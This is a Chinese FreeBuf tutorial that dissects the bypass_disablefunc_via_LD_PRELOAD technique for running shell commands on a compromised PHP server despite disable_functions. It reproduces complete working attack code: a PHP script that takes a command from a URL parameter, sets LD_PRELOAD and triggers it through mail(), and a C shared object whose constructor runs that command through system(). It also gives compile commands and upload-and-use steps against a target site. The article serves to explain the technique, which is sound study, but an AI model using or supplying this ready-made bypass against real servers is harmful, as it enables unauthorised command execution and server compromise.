## 前言

**本文为yangyangwithgnu师傅的bypass_disablefunc_via_LD_PRELOAD工程代码分析，虽yangyangwithgnu师傅写的核心思想非常清楚，但像本人一样的菜鸟缺乏一些概念基础导致难于理解整体，为此通过结合一些基础来分析源码。**

##  一、问题描述

> Getshell时无法执行系统命令

##  **二、直接利用过程**

将bypass_disablefunc.php 和 bypass_disablefunc_x64.so共享文件传到目标服务器上，指定三个参数构造URL。

<http://site.com/bypass_disablefunc.php?cmd=>命令执行输入&outpath=outpath&sopath=sopath

> 一是 cmd 参数，待执行的系统命令；
>
> 二是 outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web
> 是否可跨目录访问、文件将被覆盖和删除等几点；
>
> 三是 sopath 参数，指定劫持系统函数的共享对象的 **绝对路径** （如
> /var/www/bypass_disablefunc_x64.so）（上传时指定），另外关于该参数，你应注意 web 是否可跨目录访问到它。

前提：

> 了解系统信息，如果系统不是debian、x64同类型的linux系统则需要重新编译
>
> bypass_disablefunc_x64.so 为执行命令的共享对象，
>
> 用命令 gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so
>
> 将 bypass_disablefunc.c 编译而来。 若目标为 x86 架构，需要加上 -m32
> 选项重新编译，bypass_disablefunc_x86.so。

保证：outpath文件路径web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；

##  **三、代码执行过程描述**

1、先把恶意shell指令写成cmd >/tmp/xx 2>&1，以便读取返回信息及错误信息；

2、通过写入新的环境变量EVIL_CMDLINE（系统不存在，工程生成），从而传递恶意shell指令给予共享文件等待执行；

3、通过写入LD_PRELOAD环境变量来使准备好的共享文件代码优先加载；

4、通过mail函数触发共享文件加载；

共享文件内容工作：通过__attribute__
((__constructor__))修饰符修饰函数使得共享文件一旦被加载就会执行，无论触发加载函数（这里使用的mail）是否执行成功与否、第三方插件是否存在，只要加载即执行

5、共享文件被加载，__attribute__
((__constructor__))修饰的系统函数会比触发加载的第三方插件函数先执行。在执行系统函数system(cmdline)前，使用extern
char**
environ打断共享文件的二次加载（不然第二次加载的构造函数再执行到系统函数system(cmdline)前又第三次加载该共享文件，往返，从而到达无限循环）。

6、命令的二进制文件顺利在系统的内存中被执行，执行的结果或错误信息都记录到/tmp/xx文件中。

7、通过nl2br(file_get_contents($out_path))
句子分行的显示在网页页面上，最后通过unlink删除文件，等待下一次的写入、显示。

##  **四、代码预览**

bypass_disablefunc.php文件——传递恶意shell命令、设置最实现最高级加载、显示命令执行情况

    
    
    <?php
        echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?   
    
        $cmd = $_GET["cmd"];
        $out_path = $_GET["outpath"];
        $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";#第一步
    
        putenv("EVIL_CMDLINE=" . $evil_cmdline);#第二步
    
        $so_path = $_GET["sopath"];
        putenv("LD_PRELOAD=" . $so_path);#第三步
    
        mail("", "", "", "");#第四步
    
        echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
        unlink($out_path);第七步
    
    ?>

bypass_disablefunc_x64.so文件的C语言代码——执行恶意shell指令

    
    
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    
    extern char** environ;
    __attribute__ ((__constructor__)) void preload (void)
    {
        // get command line options and arg
        const char* cmdline = getenv("EVIL_CMDLINE");
        // unset environment variable LD_PRELOAD.
        // unsetenv("LD_PRELOAD") no effect on some 
        // distribution (e.g., centos), I need crafty trick.
        int i;
        for (i = 0; environ[i]; ++i) {
                if (strstr(environ[i], "LD_PRELOAD")) {
                        environ[i][0] = '\0';
                }
        }
        // executive command
        system(cmdline);
    }

##  **五、代码分析**

01目的：编写在系统调用第三方组件函数前先执行的函数

02操作

共享对象文件使用c语言来编写

共享的函数使用__attribute__ ((__constructor__)) 进行修饰

__attribute__ ((__constructor__)) void preload (void)

03基础概念

GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它 **修饰的函数在 main() 之前执行**
，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 。

* * *

01目的：停止环境变量对system(cmdline)函数执行前的打断

02操作：

共享文件C语言中加入以下代码，通过改环境写入\0进行清空环境变量

    
    
    extern char** environ ；
    int i；
    for (i = 0; environ[i]; ++i) { if (strstr(environ[i], "LD_PRELOAD")) { environ[i][0] = '\0'; } }

03基础概念

每个程序都有一个环境表，它是一个字符指针数组，其中每个指针包含一个以NULL结尾的C字符串的地址。全局变量environ则包含了该指针数组的地址：externchar
**environ;

在调用system(cmdline);会又使得LD_PRELOAD再加载自身，这就陷入无限循环。因此写入\0，对函数执行的环境变量修改，打断LD_PRELOAD再加载自身，从而顺利执行system(cmdline);

* * *

01目的：读取环境变量中的恶意shell指令并执行

02操作：

共享文件C语言中加入以下代码、使用C语言调用的系统函数

    
    
    const char* cmdline = getenv("EVIL_CMDLINE");
    system(cmdline);

03基础概念

读取环境变量函数及系统执行函数

getenv ( string $varname [, bool $local_only = FALSE ] ) : stringint

system(const char *command);

* * *

01目的：生成系统执行的二进制文件，供于被调用

02操作：

编译动态库、通过c语言编写功能函数，再使用GCC执行系统cmd命令

gcc -shared -fPIC -o 1.so 1.c

03基础概念

在 windows 平台和 Linux 平台下都大量存在着库。

库，是一种可执行代码的二进制形式，可以被操作系统载入内存执行。

共享库(动态库)的代码是在可执行程序运行时才载入内存的，在编译过程中仅简单的引用，因此代码体积较小。动态通常用.so为后缀

-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)，则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。

译成 x86 架构需要加上 -m32 选项

* * *

01目的：恶意shell指令组合，输出结果和错误信息都记录到指定地方/tmp/xx，从而可以被读取显示结果或错误信息

02操作：

cmd >/tmp/xx 2>&1

03基础概念：

2>&1 的意思就是将标准错误重定向到标准输出。

Linux的文件描述符--标准输入输出说明

stdin，标准输入，默认设备是键盘，文件编号为0。

stdout，标准输出，默认设备是显示器，文件编号为1，也可以重定向到文件。

stderr，标准错误，默认设备是显示器，文件编号为2，也可以重定向到文件。

>&重定向符

* * *

01目的：设置环境变量的值，传递恶意shell指令以及指定的动态库加载的优先级最高

02操作：

    
    
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    putenv("LD_PRELOAD=bypass_disablefunc_x64.so");

03基础概念：

putenv ( string $setting ) : bool

添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。如果环境中没有该服务器环境变量，则会临时存在。

EVIL_CMDLINE在环境变量是不存在，人为生成传递函数用

LD_PRELOAD的作用是为优先加载库设置

一般情况下，库加载顺序为LD_PRELOAD>LD_LIBRARY_PATH> /etc/ld.so.cache>/lib>/usr/lib。

LD_PRELOAD、LD_LIBRARY_PATH都为环境变量、/etc/ld.so.cache、/usr/lib为文件目录；

* * *

01目的：触发系统执行编写的二进制文件，执行__attribute__ ((__constructor__)) void preload (void)；

02操作：

mail("", "", "", "");

03基础概念

mail() 函数允许您从脚本中直接发送电子邮件。

注：php代码中只是为了创建新进程，触发系统对LD_PRELOAD的加载，因__attribute__ ((__constructor__))
属性的函数会优先main函数先执行，实际在该工程中mail不需要第三方sendmail的支持；

* * *

01目的：读取存入/tmp/xx的信息

02操作：

nl2br(file_get_contents($out_path))

03基础概念：

file_get_contents — 将整个文件读入一个字符串

    
    
    file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int$maxlen ]]]] ) : string

和 [file()](https://www.php.net/manual/zh/function.file.php) 一样，只除了
file_get_contents() 把文件读入一个字符串。将在参数 offset 所指定的位置开始读取长度为maxlen
的内容。如果失败，file_get_contents() 将返回 FALSE。

nl2br() 函数在字符串中的每个新行（\n）之前插入 HTML 换行符（<br> 或 <br />）。

* * *

01目的：删除文件

02操作：

unlink($out_path);

03基础概念

unlink(filename,context)

定义和用法

unlink() 函数删除文件。

如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。

参数  |  描述  
---|---  
filename  |  必需。规定要删除的文件。  
context  |  可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。  
  
##  六、总结

php.in实际为php管理文件，通过把指定函数写入黑名单，禁止php自身使用php封装的函数，但它不能禁用系统，第三方组件、甚至写成二进制执行功能的函数（无法识别）；在进一步的学习中，当遇到同样的问题再以此作为分析条件，进行针对性绕过。

##  七、原文链接

> <https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>

***本文作者： 坐忘哪需无心，转载请注明来自FreeBuf.COM**  
  
  

